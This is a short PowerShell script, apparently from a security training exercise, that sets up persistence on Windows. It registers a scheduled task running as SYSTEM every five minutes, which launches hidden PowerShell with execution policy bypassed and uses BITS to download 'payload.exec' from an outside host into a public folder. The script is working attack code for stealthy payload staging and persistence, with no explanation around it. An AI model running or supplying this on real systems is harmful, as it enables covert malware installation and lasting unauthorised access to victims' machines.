$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$JobName='PersistentJob'; $BitsJob=Get-BitsTransfer -Name $JobName -ErrorAction SilentlyContinue; if (-not $BitsJob) { Start-BitsTransfer -Source 'http://hbtn.io/payload.exec' -Destination 'C:\Users\Public\payload.exec' -Asynchronous -DisplayName $JobName }`""

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)

Register-ScheduledTask -TaskName "BITS_Persistence_Checker" -Action $action -Trigger $trigger -User "NT AUTHORITY\SYSTEM"
